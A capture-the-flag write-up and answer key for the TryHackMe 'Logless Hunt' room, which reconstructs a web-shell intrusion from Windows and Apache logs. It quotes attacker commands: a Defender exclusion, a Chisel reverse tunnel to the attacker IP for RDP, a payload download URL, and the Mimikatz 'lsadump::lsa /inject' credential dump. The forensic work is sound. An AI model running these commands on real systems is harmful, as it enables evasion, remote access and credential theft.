![Logless Hunt Banner](https://cdn-images.tryhackme.com/room-icons/678ecc92c80aa206339f0f23-1738938750807)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/loglesshunt/Logless_Hunt_Cover.png" alt="Logless Hunt Logo">
</p>

# <img src="https://cdn-images.tryhackme.com/room-icons/678ecc92c80aa206339f0f23-1738938756523" alt="image" style="vertical-align: middle;height: 50px;" /> Logless Hunt

This guide contains the answer and steps necessary to get to them for the [Logless Hunt](https://tryhackme.com/room/loglesshunt) room.

## Table of contents

- [Table of contents](#table-of-contents)
  - [Task 2 - Scenario](#task-2---scenario)
  - [Task 3 - Initial Access | Web Access Logs](#task-3---initial-access--web-access-logs)
  - [Task 4 - From Web to RDP | PowerShell Logs](#task-4---from-web-to-rdp--powershell-logs)
  - [Task 5 - Breached Admin | RDP Session Logs](#task-5---breached-admin--rdp-session-logs)
  - [Task 6 - Persistence Traces | Scheduled Tasks](#task-6---persistence-traces--scheduled-tasks)
  - [Task 7 - Credential Access | Windows Defender](#task-7---credential-access--windows-defender)

### Task 2 - Scenario

1.  After launching the VM, open Event Viewer. What is the earliest Event ID you see in the Security logs?

    Lets open the Security logs in `EventViewer` and sort by date. This should tell us what the earliest Event ID was.

    ![Events](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/loglesshunt/Logless_Hunt_Events.png)

    ><details><summary>Click for answer</summary>4690</details>

### Task 3 - Initial Access | Web Access Logs

1.  What is the title of the HR01-SRV web app hosted on 80 port?

    To find the name of the app, we can try yo see if the website is still up and running. Navigate to: `127.0.0.1:80`. Meaning the localhost on port 80.

    ![Web App](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/loglesshunt/Logless_Hunt_Web_App.png)

    ><details><summary>Click for answer</summary>Salary Raise Approver v0.1</details>

2.  Which IP performed an extensive web scan on the HR01-SRV web app?

    Looking at the Apache access logs, we can see one IP that does numerous request resulting in a 404 error. This could indicate an enumeration attack.

    ```powershell
    cat C:\Apache24\logs\access.log
    ```

    ![IP Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/loglesshunt/Logless_Hunt_Ip_Scan.png)

    ><details><summary>Click for answer</summary>10.10.23.190</details>

3.  What is the absolute path to the file that the suspicious IP uploaded?

    From the access logs we can see the attacker has succesfully uploaded a document.

    ![Uploads](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/loglesshunt/Logless_Hunt_Uploads.png)

    Lets try to enumerate that directory to file the path to the file.

    ```powershell
    gci C:\ *.php -file -ea silent -recurse
    ```

    ![Search Upload](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/loglesshunt/Logless_Hunt_Search_Upload.png)

    ><details><summary>Click for answer</summary>C:\Apache24\htdocs\uploads\search.php</details>

4.  Clearly, that's suspicious! What would you call the uploaded malware / backdoor?

    As it is used to gain RCE and uploaded to the server, it is called a web shell.

    ><details><summary>Click for answer</summary>web shell</details>

### Task 4 - From Web to RDP | PowerShell Logs

1.  What was the first command entered by the attacker?

    This we can find in the event viewer under Event ID 600.

    ![First Upload](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/loglesshunt/Logless_Hunt_First_Upload.png)

    ><details><summary>Click for answer</summary>whoami</details>

2.  What is the full URL of the file that the attacker attempted to download?

    This can be found in the same log a little further.

    ![Download](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/loglesshunt/Logless_Hunt_Download.png)

    ><details><summary>Click for answer</summary>http://10.10.23.190:8080/httpd-proxy.exe</details>

3.  What command was run to exclude the file from Windows Defender?

    Looking further in the logs, we can see an exclusion being made.

    ![Exclusion](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/loglesshunt/Logless_Hunt_Exclusion.png)

    ><details><summary>Click for answer</summary>Add-MpPreference -ExclusionPath C:\Apache24</details>

4.  Which remote access service was tunnelled using the uploaded binary?

    From the log we can see a command used in a typical service.

    ![Tunnel](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/loglesshunt/Logless_Hunt_Tunnel.png)

    ><details><summary>Click for answer</summary>RDP</details>

### Task 5 - Breached Admin | RDP Session Logs

1.  What is the timestamp of the first suspicious RDP login? (format: 2025-01-05 15:30:45)

    If we look at the logs in: `Event Viewer -> Apps and Services Logs -> Microsoft -> Windows -> PowerShell -> Operational`. Looking for Event 22.

    Now look for an RDP session started by the IP we found previously. This must also match the time at which we previously found the tunnel to be started.

    ![RDP](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/loglesshunt/Logless_Hunt_Rdp.png)

    ><details><summary>Click for answer</summary>2025-01-23 17:00:12</details>

2.  What user did the attacker breach? (format: HOSTNAME\USER)

    In the same log we can see what user was logged into.

    ><details><summary>Click for answer</summary>HR01-SRV\Administrator</details>

3.  What IP is shown as the source of the RDP login?

    This is the same as the one we found previously.

    ><details><summary>Click for answer</summary>10.10.23.190</details>

4.  What is the timestamp when the attacker disconnected from RDP? (format: 2025-01-05 15:30:45)

    The next entry in the log with event ID 24 marks a disconnect.

    ><details><summary>Click for answer</summary>2025-01-23 17:16:46</details>

### Task 6 - Persistence Traces | Scheduled Tasks

1.  What is the name of the suspicious scheduled task?

    Looking for Event 106 in the logs: `Event Viewer -> Apps and Services Logs -> Microsoft -> Windows -> TaskScheduler -> Operational`

    We can see one task being created during the RDP session.

    ![Task](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/loglesshunt/Logless_Hunt_Task.png)

    ><details><summary>Click for answer</summary>Apache Proxy</details>

2.  When was the suspicious scheduled task created? (format: 2025-01-05 15:30:45)

    Lest search for this in the Task Scheduler window.

    ![Creation](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/loglesshunt/Logless_Hunt_Creation.png)

    ><details><summary>Click for answer</summary>2025-01-23 17:05:37</details>

3.  What is the task's "Trigger" value as shown in Task Scheduler GUI?

    This can be found in the triggers pane.

    ![Triggers](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/loglesshunt/Logless_Hunt_Triggers.png)

    ><details><summary>Click for answer</summary>At System startup</details>

4.  What is the full command line of the malicious task?

    Looking at the Actions pane, we can find the command that is executed.

    ![Action](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/loglesshunt/Logless_Hunt_Action.png)

    ><details><summary>Click for answer</summary>C:\Apache24\bin\httpd-proxy.exe client 10.10.23.190:10443 R:3389:127.0.0.1:3389</details>

### Task 7 - Credential Access | Windows Defender

1.  What is the threat family ("Name") of the first quarantined file?

    Lets look at the Defender logs at: `Event Viewer -> Apps and Services Logs -> Microsoft -> Windows -> Windows Defender -> Operational` (Event ID 1116,1117,5001,5007,5013)

    The first hit is the proxy file before adding exceptions.

    ![First Malware](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/loglesshunt/Logless_Hunt_First_Malware.png)

    ><details><summary>Click for answer</summary>VirTool:Win64/Chisel.G</details>

2.  And what is the threat family of the next detected malware?

    The second hit is mimikatz.

    ![Second Malware](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/loglesshunt/Logless_Hunt_Second_Malware.png)

    ><details><summary>Click for answer</summary>HackTool:Win32/Mimikatz!pz</details>

3.  What is the file name of the downloaded Mimikatz executable?

    This can be seen in the same event log.

    ><details><summary>Click for answer</summary>mimi.exe</details>

4.  Finally, which Mimikatz command was used to extract hashes from LSASS memory?

    For this we need to go back to the powershell logs.

    ![Mimi](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/loglesshunt/Logless_Hunt_Mimi.png)

    ><details><summary>Click for answer</summary>lsadump::lsa /inject</details>

